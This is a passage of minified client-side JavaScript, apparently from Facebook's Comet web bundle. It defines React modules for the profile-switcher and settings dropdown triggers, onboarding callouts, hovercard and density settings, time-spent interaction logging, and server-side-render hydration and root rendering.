        );
        var T = c("useCometCallout")(
            o(function () {
              return babelHelpers["extends"]({}, r, { label: da });
            }, []),
            N
          ),
          U = c("useCometCalloutNUX")(
            t,
            o(function () {
              return babelHelpers["extends"]({}, r, { label: ba });
            }, []),
            D
          ),
          V = c("useCometCalloutNUX")(
            u,
            o(function () {
              return babelHelpers["extends"]({}, r, { label: ca });
            }, []),
            a && F
          ),
          W = c("useFXSwitcherSwitchedSuccessLogger")(),
          ja = m(
            function (a) {
              var e, f;
              e =
                a == null
                  ? void 0
                  : (e = a.viewer) == null
                  ? void 0
                  : (e = e.actor) == null
                  ? void 0
                  : e.name;
              f =
                a == null
                  ? void 0
                  : (f = a.viewer) == null
                  ? void 0
                  : (f = f.actor) == null
                  ? void 0
                  : (f = f.profile_picture) == null
                  ? void 0
                  : f.uri;
              var g = (j || (j = c("WebStorage"))).getSessionStorage(),
                i = c("previousProfileIdForToastSessionStorage").get();
              if (e != null && i != null) {
                (g == null
                  ? void 0
                  : g.getItem("did_profile_switch_come_from_switcher")) === "1" &&
                  W({ switch_type: "intra_app" });
                if (b("cr:3923") && a)
                  var k = c("BaseToasterStateManager").getInstance(),
                    m = k.push(
                      l.jsx(b("cr:3923"), {
                        onDismiss: function () {
                          k.expire(m);
                        },
                        previousProfileID: i,
                        query: a,
                      }),
                      5e3
                    );
                else {
                  i =
                    f != null
                      ? l.jsx(c("TetraProfilePhoto.react"), {
                          shape: "circle",
                          size: 32,
                          source: { uri: f },
                        })
                      : null;
                  d("cometPushToast").cometPushToast(
                    {
                      icon: i,
                      message: h._("__JHASH__pj7jBTJLgFB__JHASH__", [
                        h._param(
                          "profile name",
                          l.jsx(c("TetraText.react"), {
                            type: "headlineEmphasized4",
                            children: e,
                          })
                        ),
                      ]),
                    },
                    5e3
                  );
                }
                c("previousProfileIdForToastSessionStorage").remove();
                g == null
                  ? void 0
                  : g.removeItem("did_profile_switch_come_from_switcher");
              }
            },
            [W]
          ),
          X = c("useCometCalloutNUX")(
            v,
            o(
              function () {
                return babelHelpers["extends"]({}, r, {
                  label:
                    ((Q = h._enum(C, c("ActorTypes$FbtEnum"))),
                    h._("__JHASH__XrvIqubxcIN__JHASH__", [
                      Q,
                      h._implicitParam(
                        "=m1",
                        l.jsx("span", {
                          className: "x117nqv4",
                          children: h._("__JHASH__B_CQfx-9oXJ__JHASH__", [
                            Q,
                            h._param("profile_name", B),
                          ]),
                        })
                      ),
                    ])),
                });
              },
              [B, C]
            ),
            H
          ),
          Y = o(function () {
            return h._("__JHASH__BltsubDscEA__JHASH__");
          }, []);
        R = c("useCometPulseNUX")(
          w,
          o(
            function () {
              return {
                calloutProps: {
                  align: "middle",
                  arrowStyle: "inset",
                  hasCloseButton: !0,
                  label: Y,
                  position: "below",
                  type: "accent",
                },
                contextualLayerProps: { align: "middle", position: "below" },
                pulseProps: { label: "pulse for switcher education" },
              };
            },
            [Y]
          ),
          Boolean(c("qex")._("988")) && J
        );
        var Z = R.targetRef;
        N = R.view;
        var $ = c("useCometCalloutNUX")(
          d("CometProfilePlusAdminEducationStrings")
            .PROFILE_PLUS_EDUCATION_CLOSED_PROFILE_SWITCHER_NUX_ID,
          o(function () {
            return babelHelpers["extends"]({}, r, {
              disableOutsideClick: !0,
              label: h._("__JHASH__z6AakHEMB8t__JHASH__"),
              onClose: function () {
                ia(!0);
              },
              xstyle: q.personalProfilePageAdminSwitcherTooltip,
            });
          }, []),
          ga
        );
        D = d("useTopNavigationLogging").useSettingsButtonLoggingCallbacks();
        var ka = D[0],
          la = D[1];
        a = c("useCometPromptProfileSwitcherEducation")();
        var ma = a.hideCallout,
          na = c("useEndCometNUXTour")();
        F = m(
          function (a) {
            i && i(a), E(!1), G(!1), I(!1), K(!1), O(!1), ka(), ma(), na();
          },
          [i, ka, ma, na]
        );
        var oa = c("useCometProfileChangeCallout")(),
          pa = c("useCometSettingsDropdownTriggerNUXTours.react")({
            profileName: B,
          });
        H = o(
          function () {
            return c("mergeRefs")(T, X, V, U, $, e, la, Z, oa, pa);
          },
          [T, X, V, U, $, e, la, Z, oa, pa]
        );
        J = d("CometSwitcherGating").shouldShowProfileSwitcherDropdownArrow();
        if (x != null)
          return l.jsx(c("CometContextualLayerAnchorRoot.react"), {
            children: l.jsx(c("CometProfilePhoto.react"), {
              addOn: J
                ? {
                    backgroundColor: "var(--secondary-button-background)",
                    icon: l.jsx(c("CometIcon.react"), {
                      color: "primary",
                      icon: c("ChevronDownFilled16IconSvg.react"),
                      size: 12,
                    }),
                    size: 28,
                    type: "activityBadge",
                  }
                : void 0,
              alt: s,
              onHoverIn: f,
              onHoverOut: g,
              onPress: F,
              onPressIn: k,
              ref: H,
              size: y,
              source: { uri: x },
              testid: void 0,
              children: N,
            }),
          });
        else
          return l.jsxs(c("CometContextualLayerAnchorRoot.react"), {
            children: [
              l.jsx(c("CometCircleButton.react"), {
                icon: c("TriangleDownFilled20IconSvg.react"),
                label: s,
                onHoverIn: f,
                onHoverOut: g,
                onPress: F,
                onPressIn: k,
                ref: H,
                size: y,
                testid: void 0,
                type: z,
              }),
              N,
            ],
          });
      }
      f = l.forwardRef(a);
      g["default"] = f;
    },
    98
  );
  __d(
    "CometSettingsDropdownTriggerWrapper.react",
    [
      "fbt",
      "CometPlaceholder.react",
      "CometSettingsBadge.react",
      "CometSettingsDropdownPopoverTrigger.react",
      "CometSettingsDropdownTrigger.react",
      "CometTooltip.react",
      "gkx",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j,
        k = j || d("react"),
        l = {
          badge: {
            end: "xds687c",
            left: null,
            right: null,
            position: "x10l6tqk",
            top: "x13vifvy",
            $$css: !0,
          },
          horizontalOffset: {
            paddingStart: "x1ye3gou",
            paddingLeft: null,
            paddingRight: null,
            paddingEnd: "xn6708d",
            $$css: !0,
          },
          wrapper: { display: "x78zum5", position: "x1n2onr6", $$css: !0 },
        },
        m = c("gkx")("1663500"),
        n = h._("__JHASH__mp7QcW6dSyw__JHASH__");
      function a(a) {
        var b = a.dropdownPosition,
          d = b === void 0 ? "below" : b;
        a.isSelected;
        a.onVisibilityChange;
        var e = a.profilePictureUri;
        b = m ? "small" : "large";
        return k.jsx(c("CometSettingsDropdownPopoverTrigger.react"), {
          dropdownPosition: d,
          iconSize: b,
          tracePolicy: "comet.jewel.settings",
          children: function (a, b, f, g, h, j, m, p) {
            return k.jsx(c("CometTooltip.react"), {
              position: d,
              tooltip: n,
              children: k.jsxs("div", {
                className: (i || (i = c("stylex")))(
                  l.wrapper,
                  d === "end" && l.horizontalOffset
                ),
                ref: a,
                children: [
                  k.jsx(c("CometSettingsDropdownTrigger.react"), {
                    onHoverIn: g,
                    onHoverOut: h,
                    onPress: b,
                    onPressIn: j,
                    profilePictureUri: e,
                    size: 40,
                    testid: void 0,
                    type: p ? "deemphasized-overlay" : "normal",
                  }),
                  k.jsx(o, { isVisible: p }),
                ],
              }),
            });
          },
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      function o(a) {
        a = a.isVisible;
        return k.jsx("div", {
          className: "xds687c x10l6tqk x13vifvy",
          children: k.jsx(c("CometPlaceholder.react"), {
            fallback: null,
            children: k.jsx(c("CometSettingsBadge.react"), { isActive: a }),
          }),
        });
      }
      o.displayName = o.name + " [from " + f.id + "]";
      b = k.memo(a);
      g["default"] = b;
    },
    98
  );
  __d(
    "XFBHovercardInteractionPreferenceUtils.facebook",
    ["$InternalEnumUtils", "HovercardInteractionPreference"],
    function (a, b, c, d, e, f, g) {
      a = d("$InternalEnumUtils").createToJSEnum(
        c("HovercardInteractionPreference")
      );
      b = d("$InternalEnumUtils").createFromJSEnum(
        c("HovercardInteractionPreference")
      );
      g.toJSEnum = a;
      g.fromJSEnum = b;
    },
    98
  );
  __d(
    "CometHovercardSettingsProvider.react",
    [
      "CometHovercardSettings",
      "CometHovercardSettingsContext",
      "HovercardInteractionPreference",
      "RelayHooks",
      "XFBHovercardInteractionPreferenceUtils.facebook",
      "react",
      "requireDeferred",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useMemo,
        l = b.useState,
        m = c("requireDeferred")("SetHovercardInteractionPreference").__setRef(
          "CometHovercardSettingsProvider.react"
        ),
        n = 2;
      n =
        (e = c("HovercardInteractionPreference").cast(
          c("CometHovercardSettings").hovercardInteractionPreference
        )) != null
          ? e
          : n;
      function a(a) {
        a = a.children;
        var b = d("RelayHooks").useRelayEnvironment(),
          e = l(n),
          f = e[0],
          g = e[1],
          h = j(
            function (a) {
              var c = d(
                "XFBHovercardInteractionPreferenceUtils.facebook"
              ).fromJSEnum(a);
              if (c) {
                g(a);
                m.onReady(function (a) {
                  a({ environment: b, input: { input: { preference: c } } });
                });
                return;
              }
            },
            [b]
          );
        e = k(
          function () {
            return {
              hovercardInteractionPreference: f,
              setHovercardInteractionPreference: h,
            };
          },
          [f, h]
        );
        return i.jsx(c("CometHovercardSettingsContext").Provider, {
          value: e,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSetDenseModeMutation",
    ["CometSetDenseModeMutation.graphql"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h !== void 0 ? h : (h = b("CometSetDenseModeMutation.graphql"));
      g["default"] = a;
    },
    98
  );
  __d(
    "CometDensityModeStateProvider.react",
    [
      "CometDenseModeSetting",
      "CometDensityModeContext",
      "CometRelay",
      "CometRelayEnvironment",
      "CometSetDenseModeMutation",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useMemo,
        l = b.useState;
      function a(a) {
        a = a.children;
        var b = l(d("CometDenseModeSetting").initialSetting === "COMPACT"),
          e = b[0],
          f = b[1],
          g = j(
            function (a, b) {
              var g = b.onRevert,
                h = a ? "COMPACT" : "DEFAULT";
              f(h === "COMPACT");
              function i(a) {
                a = a.getRoot().getLinkedRecord("viewer");
                if (a == null) return;
                var b = a.getValue("dense_mode_setting");
                if (b === h) return;
                a.setValue("dense_mode_setting", h);
              }
              d("CometRelay").commitMutation(c("CometRelayEnvironment"), {
                mutation: c("CometSetDenseModeMutation"),
                onError: function () {
                  f(d("CometDenseModeSetting").initialSetting === "COMPACT"),
                    g(e);
                },
                optimisticUpdater: i,
                variables: { input: { density_mode: h } },
              });
            },
            [e]
          ),
          h = j(
            function (a) {
              g(a, {
                onRevert: function (a) {
                  f(a);
                },
              });
            },
            [g]
          );
        b = k(
          function () {
            return [e, h];
          },
          [e, h]
        );
        return i.jsx(c("CometDensityModeContext").Provider, {
          value: b,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSetKeyCommandWrapperDialogs.react",
    [
      "CometKeyCommandContext",
      "CometKeyCommandSettingsContext",
      "JSResourceForInteraction",
      "emptyFunction",
      "react",
      "useCometLazyDialog",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      b = h || d("react");
      var i = b.useContext,
        j = b.useEffect,
        k = c("JSResourceForInteraction")(
          "CometModifiedKeyCommandWrapperDialog.react"
        ).__setRef("CometSetKeyCommandWrapperDialogs.react"),
        l = c("JSResourceForInteraction")(
          "CometKeyCommandWrapperDialog.react"
        ).__setRef("CometSetKeyCommandWrapperDialogs.react");
      function a() {
        var a,
          b = i(c("CometKeyCommandSettingsContext"));
        a = (a = i(c("CometKeyCommandContext"))) != null ? a : {};
        var d = a.setShowModifiedKeyCommandWrapperDialogRef,
          e = a.setShowSingleCharacterKeyCommandWrapperDialogRef;
        a = c("useCometLazyDialog")(k);
        var f = a[0];
        a = c("useCometLazyDialog")(l);
        var g = a[0];
        j(
          function () {
            var a = c("emptyFunction");
            d &&
              (a = d(function (a, d) {
                f(
                  {
                    command: a,
                    setModifiedKeyboardShortcutsPreference:
                      b.setModifiedKeyboardShortcutsPreference,
                    singleCharDescription: d,
                  },
                  c("emptyFunction")
                );
              }));
            return a;
          },
          [d, f, b.setModifiedKeyboardShortcutsPreference]
        );
        j(
          function () {
            var a = c("emptyFunction");
            e &&
              (a = e(function (a, d) {
                g(
                  {
                    command: a,
                    setAreSingleKeysDisabled: b.setAreSingleKeysDisabled,
                    singleCharDescription: d,
                  },
                  c("emptyFunction")
                );
              }));
            return a;
          },
          [e, g, b.setAreSingleKeysDisabled]
        );
        return null;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometTimeSpentBitArrayLoggerUpdater",
    ["CometThrottle", "CometTimeSpentBitArrayLogger"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = null,
        i = null;
      function j() {
        d("CometTimeSpentBitArrayLogger").updateTimeSpentArray(Date.now());
      }
      a = c("CometThrottle")(
        function (a) {
          if (a instanceof MouseEvent) {
            if (
              /^mouse(enter|leave|move|out|over)$/.test(a.type) &&
              a.pageX === h &&
              a.pageY === i
            )
              return;
            h = a.pageX;
            i = a.pageY;
          }
          j();
        },
        500,
        { leading: !0, trailing: !1 }
      );
      b = { capture: !0, passive: !0 };
      g.updateTimeSpentArrayWithCurrentTimestamp = j;
      g.updateTimeSpentArrayThrottled = a;
      g.LISTENER_OPTIONS = b;
    },
    98
  );
  __d(
    "CometTimeSpentEventListener.react",
    ["CometTimeSpentBitArrayLoggerUpdater", "useGlobalEventListener"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a, b;
        (b = c("useGlobalEventListener"))(
          "click",
          (a = d("CometTimeSpentBitArrayLoggerUpdater"))
            .updateTimeSpentArrayWithCurrentTimestamp,
          a.LISTENER_OPTIONS
        );
        b(
          "focus",
          a.updateTimeSpentArrayWithCurrentTimestamp,
          a.LISTENER_OPTIONS
        );
        b(
          "keydown",
          a.updateTimeSpentArrayWithCurrentTimestamp,
          a.LISTENER_OPTIONS
        );
        b("mousemove", a.updateTimeSpentArrayThrottled, a.LISTENER_OPTIONS);
        b("scroll", a.updateTimeSpentArrayThrottled, a.LISTENER_OPTIONS);
        return null;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPlatformAppWrapper.react",
    [
      "CometAccessibilityAlertProvider.react",
      "CometErrorBoundary.react",
      "CometErrorProjectContext",
      "CometPlaceholder.react",
      "CometSSRMultipassBoundary.react",
      "CometSetKeyCommandWrapperDialogs.react",
      "CometTimeSpentEventListener.react",
      "CometTransientDialogProvider.react",
      "TopLevelKeyCommandListener.react",
      "hero-tracing-placeholder",
      "react",
      "recoverableViolation",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useCallback;
      function k(a) {
        a =
          (a = d(
            "hero-tracing-placeholder"
          ).HeroPlaceholderUtils.createThenableDescription(a)) != null
            ? a
            : "";
        c("recoverableViolation")(
          "Top level suspense boundary triggered, a component suspended outside of a CometPlaceholder, description: " +
            a,
          "comet_infra"
        );
      }
      function a(a) {
        var b = a.KeyboardSettingsStateProvider,
          d = a.UncaughtErrorFallback,
          e = a.children;
        a = a.disableTimeSpentLogging;
        a = a === void 0 ? !1 : a;
        b = (b = b) != null ? b : i.Fragment;
        var f = j(
          function () {
            return d == null
              ? null
              : i.jsx(c("CometPlaceholder.react"), {
                  fallback: null,
                  children: i.jsx(d, {}),
                });
          },
          [d]
        );
        return i.jsx(c("CometErrorProjectContext").Provider, {
          value: "comet_root",
          children: i.jsx(i.Suspense, {
            fallback: null,
            suspenseCallback: k,
            children: i.jsx(c("CometErrorBoundary.react"), {
              context: { project: "comet_platform_root_boundary" },
              fallback: f,
              children: i.jsxs(c("CometSSRMultipassBoundary.react"), {
                fallback: null,
                id: "root",
                children: [
                  i.jsx(b, {
                    children: i.jsx(c("TopLevelKeyCommandListener.react"), {
                      children: i.jsxs(c("CometTransientDialogProvider.react"), {
                        children: [
                          i.jsx(c("CometAccessibilityAlertProvider.react"), {
                            children: e,
                          }),
                          i.jsx(c("CometSetKeyCommandWrapperDialogs.react"), {}),
                        ],
                      }),
                    }),
                  }),
                  a !== !0 && i.jsx(c("CometTimeSpentEventListener.react"), {}),
                ],
              }),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPreloaderInit",
    ["RelayAPIConfig", "RelayPrefetchedStreamCache"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        if (a && a.length)
          for (
            var a = a,
              b = Array.isArray(a),
              e = 0,
              a = b
                ? a
                : a[
                    typeof Symbol === "function" ? Symbol.iterator : "@@iterator"
                  ]();
            ;
  
          ) {
            var f;
            if (b) {
              if (e >= a.length) break;
              f = a[e++];
            } else {
              e = a.next();
              if (e.done) break;
              f = e.value;
            }
            f = f;
            d("RelayPrefetchedStreamCache").registerPreloader(
              f.preloaderID,
              f.queryID,
              f.variables,
              (f = f.actorID) != null ? f : c("RelayAPIConfig").actorID
            );
          }
      }
      g.initPreloaders = a;
    },
    98
  );
  __d(
    "CometSSRHydrationHelpers",
    ["CometSSRClientRender", "cr:2602"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = function (a) {
        h = a;
      };
      b = function (a) {
        if (a != null && typeof a.message === "string") {
          var b = a.message;
          if (b.indexOf("Minified React error #421;") !== -1) {
            var c;
            (c = h) == null
              ? void 0
              : c.addAnnotationBoolean(
                  "ssr_suspense_boundary_received_update",
                  !0
                );
            return;
          }
          if (
            b.indexOf("The server could not finish this Suspense boundary") !==
              -1 ||
            b.indexOf("Minified React error #419;") !== -1 ||
            b.indexOf("This Suspense boundary received an update") !== -1 ||
            b.indexOf("The render was aborted by the server without a reason") !==
              -1 ||
            b.indexOf("The server did not finish this Suspense boundary") !==
              -1 ||
            b.indexOf(d("CometSSRClientRender").CometSSRClientRenderError) !== -1
          )
            return;
          typeof reportError === "function" && reportError(a);
        }
      };
      g.initHydrationHelperTraceAPIObj = a;
      g.onRecoverableError = b;
    },
    98
  );
  __d(
    "getPaintTime",
    [
      "cancelAnimationFrame",
      "clearTimeout",
      "performanceNow",
      "requestAnimationFrame",
      "setTimeout",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      function a(a, b) {
        var d = null,
          e,
          f,
          g,
          i = function () {
            var a;
            (a = d) == null ? void 0 : a.disconnect();
            c("clearTimeout")(e);
            c("clearTimeout")(f);
            c("cancelAnimationFrame")(g);
          };
        e = c("setTimeout")(function () {
          e = c("setTimeout")(function () {
            e = c("setTimeout")(function () {
              i(), a(null, (h || (h = c("performanceNow")))());
            }, 100);
          }, 0);
        }, 16);
        if (IntersectionObserver) {
          var j = {};
          d = new IntersectionObserver(function (b) {
            b =
              (b = (b = b[0]) == null ? void 0 : b.time) != null
                ? b
                : (h || (h = c("performanceNow")))();
            i();
            a(b, b);
          }, j);
          d.observe((j = b) != null ? j : window.document.body);
        } else
          c("requestAnimationFrame") && c("cancelAnimationFrame")
            ? (g = c("requestAnimationFrame")(function () {
                f = c("setTimeout")(function () {
                  i(), a(null, (h || (h = c("performanceNow")))());
                }, 0);
              }))
            : (i(), a(null, (h || (h = c("performanceNow")))()));
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSSRLogger",
    ["getPaintTime"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        return {
          logPayloadReceivedFromInlineInjector: function () {},
          logSSRInjection: function () {},
          logSSRShown: function () {},
        };
      }
      function b(a) {
        return {
          logPayloadReceivedFromInlineInjector: function (b) {
            var c = b.clickEvents,
              d = b.msg,
              e = b.processedPayloads;
            b = b.status;
            a.addMetadata("ssr_inline_status", b + " " + (d || ""));
            a.addMetadata("ssr_inline_click_events", c.total);
            e &&
              e.forEach(function (b) {
                var c;
                c = (c = b.id) != null ? c : "global_failure";
                a.addMetadata("ssr_status_" + c, b.status);
              });
          },
          logSSRInjection: function (b) {
            a.addMetadata("ssr_injected", b ? 1 : 0),
              b &&
                (a.addMarkerPoint("ssr_shown", "AppTiming"),
                c("getPaintTime")(function (b, c) {
                  var d;
                  a.addMarkerPoint(
                    "ssr_paint",
                    "AppTiming",
                    (d = b) != null ? d : c,
                    { estimatedPaintTime: b == null }
                  );
                }));
          },
          logSSRShown: function (b) {
            a.addMarkerPoint("ssr_shown_" + b, "AppTiming");
          },
        };
      }
      g.initNoopLogger = a;
      g.initLogger = b;
    },
    98
  );
  __d(
    "jestOnlyViolation",
    ["FBLogger"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d) {
        d = d === void 0 ? {} : d;
        d = d.error;
        b = c("FBLogger")(b);
        d && (b = b.catching(d));
        b.blameToPreviousFrame().fatal("Jest-Only Fatal: " + a);
        return null;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSSRContentInjector",
    [
      "CometSSRFizzContentInjector",
      "CometSSRHydrationHelpers",
      "CometSSRLogger",
      "cr:2010754",
      "gkx",
      "jestOnlyViolation",
      "performanceNow",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = d("CometSSRLogger").initNoopLogger(),
        j = !1,
        k = !1,
        l = null,
        m = null,
        n = {},
        o = null;
      function p(a) {
        switch (a) {
          case "fail_js_error":
            return "server_js_error";
          case "fail_infra_error":
            return "server_infra_error";
          case "fail_ssr_disabled":
            return "ssr_disabled";
          case "fail_feed_module_not_supported":
            return "feed_module_not_supported";
          case "fail_bad_preloaders":
            return "bad_preloaders";
          case "fail_unknown_boundaries":
            return "unknown_boundaries";
          case "fail_timed_out":
            return "timed_out";
          default:
            return "unknown";
        }
      }
      var q = { root: "pending" },
        r = 0,
        s = new Map();
      function t() {
        return {
          boundaryErrorStatuses: babelHelpers["extends"]({}, n),
          boundaryStatuses: babelHelpers["extends"]({}, q),
          globalBoundaryErrorStatus: m,
        };
      }
      function u() {
        if (s.size === 0) return;
        var a = t();
        s.forEach(function (b) {
          return b(a);
        });
      }
      function a() {
        return t();
      }
      var v = null;
      function e(a) {
        v = a;
      }
      function w(a) {
        if (b("cr:2010754")) {
          var d = (h || (h = c("performanceNow")))(),
            e = a.querySelectorAll("img");
          Array.from(e).forEach(function (a) {
            b("cr:2010754").trackImagePerf(a, d, a.currentSrc || a.src, {
              mutationType: "ssrUnhide",
            });
          });
          e = a.querySelectorAll("image");
          Array.from(e).forEach(function (a) {
            b("cr:2010754").trackImagePerf(
              a,
              d,
              (a = a.getAttribute("xlink:href")) != null ? a : "",
              { mutationType: "ssrUnhide" }
            );
          });
        }
      }
      function f(a, b) {
        var c = document.getElementById("caa-reg-fb-welcome-content");
        c != null &&
          (b.addAnnotationInt("enable_caa_welcome_screen_delay", 1),
          l != null && window.clearTimeout(l),
          (l = window.setTimeout(function () {
            window.clearTimeout(l), (l = null), k && x(a);
          }, 2e3)));
      }
      function x(a) {
        if (c("gkx")("6830") || k) return;
        k = !0;
        var b = document.getElementById("caa-reg-fb-welcome-content");
        if (l != null && b != null) return;
        if (!j && c("gkx")("3728")) {
          b = document.getElementById("splash-screen");
          b !== null && (j = !0);
        }
        if (!j) {
          b = document.getElementById("splash-screen");
          b !== null && (b.remove(), (j = !0));
        }
        a.style.visibility = "";
        a.style.display = "";
        w(a);
      }
      function y() {
        return o;
      }
      function z(a) {
        var b = r++;
        s.set(b, a);
        return {
          release: function () {
            s["delete"](b);
          },
        };
      }
      function A(a, b, c) {
        b &&
          ((i = d("CometSSRLogger").initLogger(b)),
          d("CometSSRHydrationHelpers").initHydrationHelperTraceAPIObj(b));
        var e = c.onAllPayloadsInjected,
          f = c.onFirstPayloadInjected,
          g = c.onPayloadInjected;
        d("CometSSRFizzContentInjector").eventEmitter.on(
          "FIRSTPAYLOADINJECTED",
          function (a) {
            f == null ? void 0 : f(a);
          }
        );
        d("CometSSRFizzContentInjector").eventEmitter.on(
          "PAYLOADINJECTED",
          function (b, c) {
            g == null
              ? void 0
              : g(b, c, function () {
                  return x(a);
                });
          }
        );
        d("CometSSRFizzContentInjector").eventEmitter.on(
          "ALLPAYLOADSINJECTED",
          function (b) {
            x(a);
            e == null ? void 0 : e(b.status);
            if (!b) return;
            i.logPayloadReceivedFromInlineInjector(b);
            i.logSSRInjection(b.status === "INJECTED");
            b.status === "INJECTED"
              ? b.processedPayloads &&
                b.processedPayloads.forEach(function (a) {
                  a = a.id;
                  a && (i.logSSRShown(a), (q[a] = "content_injected"));
                })
              : (v == null ? void 0 : v(), B(b));
            u();
          }
        );
      }
      function B(a) {
        a.processedPayloads &&
          a.processedPayloads.forEach(function (a) {
            var b = a.id;
            a = a.status;
            if (a !== "success") {
              var c = p(a);
              b && ((n[b] = c), (q[b] = "client_rendered"));
              m = m === null || m === "unknown" ? c : m;
              a !== "fail_ssr_disabled" && C(c);
            }
          });
      }
      function C(a) {
        c("gkx")("1501502") &&
          c("jestOnlyViolation")(
            "Encountered error during server rendering: " +
              a +
              "! See slog for error details. (client rendering prevented since comet_ssr_fatal_on_error is enabled)",
            "comet_infra"
          );
      }
      window.__SSRFailJestOnError = C;
      g.__getDebugState = a;
      g.onForceHydration = e;
      g.maybeInitTimerForCaaRegistrationWelcomeScreen = f;
      g.getSSRDebugSnapshot = y;
      g.__onDebugStateChange = z;
      g.initFizz = A;
    },
    98
  );
  __d(
    "CometSSRForceHydrationContainer.react",
    ["CometSSRContentInjector", "ReactDOMComet", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useEffect,
        k = b.useState,
        l = i.createContext(0);
      function a(a) {
        a = a.children;
        var b = k(0),
          c = b[0],
          e = b[1];
        j(function () {
          d("CometSSRContentInjector").onForceHydration(function () {
            d("ReactDOMComet").flushSync(function () {
              e(1);
            });
          });
        }, []);
        return i.jsx(l.Provider, { value: c, children: a });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPlatformBaseClientRootRenderer",
    [
      "CometPreloaderInit",
      "CometSSRContentInjector",
      "CometSSRForceHydrationContainer.react",
      "CometSSRHydrationHelpers",
      "InteractionTracingMetrics",
      "ReactDOMComet",
      "cr:1652",
      "cr:5473",
      "cr:683059",
      "react",
      "unrecoverableViolation",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react"),
        j = new Map(),
        k = {
          onTransitionComplete: function (a, b, d) {
            c("InteractionTracingMetrics").addMarkerPoint(
              a,
              "transitionComplete",
              "AppTiming",
              d,
              { startTime: b }
            ),
              j["delete"](a);
          },
          onTransitionProgress: function (a, b, d, e) {
            var f = j.get(a) || 0;
            j.set(a, f + 1);
            c("InteractionTracingMetrics").addMarkerPoint(
              a,
              "transitionProgress_" + f.toString(),
              "AppTiming",
              d,
              { pending: e.length, startTime: b }
            );
          },
          onTransitionStart: function (a, b) {
            c("InteractionTracingMetrics").addMarkerPoint(
              a,
              "transitionStart",
              "AppTiming",
              b
            );
          },
        };
      function a(a) {
        var e = a.buildRootComponent,
          f = a.config,
          g = a.expectedPreloaders,
          h = a.initClient,
          j = a.rootElementID,
          m = a.ssrEnabled;
        a = a.traceAPI;
        var n = document.getElementById(j);
        if (n == null)
          throw c("unrecoverableViolation")(
            "React root mount point not found",
            "comet_infra"
          );
        j = f.concurrentModeEnabled;
        j = j === void 0 ? !0 : j;
        var o = f.decorateTraceAPI,
          p = f.initClientAndServer,
          q = f.initDarkMode,
          r = f.onSSRAllPayloadsInjected,
          s = f.onSSRPayloadInjected;
        f = f.strictModeEnabled;
        f = f === void 0 ? !0 : f;
        l(a);
        b("cr:683059") != null && b("cr:683059").setupNavigationMutationRoot(n);
        q != null && q();
        d("CometPreloaderInit").initPreloaders(g);
        p && p();
        h();
        var t = e();
        a.addMarkerPoint("reactStart", "AppTiming");
        a.addMetadata("reactVersion", i.version);
        o && o(a);
        var u = null,
          v = !1,
          w = {
            unstable_concurrentUpdatesByDefault: j,
            unstable_strictMode: f,
            unstable_transitionCallbacks: k,
          };
        function x() {
          v && b("cr:1652")(u);
        }
        function y(a) {
          var b = d("ReactDOMComet").createRoot(a, w);
          b.render(i.jsx(t, { rootElement: a }));
        }
        m === !0
          ? d("CometSSRContentInjector").initFizz(n, a, {
              onAllPayloadsInjected: function (a) {
                (v = !0), r == null ? void 0 : r(u, a), x();
              },
              onFirstPayloadInjected: function (a) {
                a === void 0 && (a = !0),
                  a
                    ? (u = d("ReactDOMComet").hydrateRoot(
                        n,
                        i.jsx(c("CometSSRForceHydrationContainer.react"), {
                          children: i.jsx(t, { rootElement: n }),
                        }),
                        babelHelpers["extends"]({}, w, {
                          onRecoverableError: d("CometSSRHydrationHelpers")
                            .onRecoverableError,
                        })
                      ))
                    : y(n);
              },
              onPayloadInjected: function (a, b, c) {
                s == null ? void 0 : s(a, b, c);
              },
            })
          : y(n);
      }
      function l(a) {
        a.onVcMetricsComplete(function (a, c) {
          b("cr:5473") != null &&
            c &&
            !(
              a.wasCanceled ||
              ((a = a.annotations["int"]) == null ? void 0 : a.aborted) === 1
            ) &&
            b("cr:5473").detect(c);
        });
      }
      g.initClientRender = a;
    },
    98
  );
  __d(
    "getInstanceIdentifierFromRoute",
    ["getCometEntityKey"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        a = c("getCometEntityKey")(a);
        if (a != null) return JSON.stringify(a);
        else return null;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPlatformRouterRootClientRenderer",
    [
      "CometNavigationTracing",
      "CometPlatformBaseClientRootRenderer",
      "ExecutionEnvironment",
      "getInstanceIdentifierFromRoute",
      "uuidv4",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
